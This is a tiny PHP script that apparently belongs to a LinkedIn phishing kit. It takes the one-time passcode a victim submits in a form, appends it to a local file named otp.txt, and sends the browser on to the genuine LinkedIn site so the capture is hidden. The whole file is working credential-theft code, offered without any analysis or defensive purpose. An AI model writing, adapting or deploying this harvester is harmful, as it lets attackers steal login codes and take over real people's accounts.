<?php
file_put_contents("otp.txt", "Linkedin OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.linkedin.com/');
?>
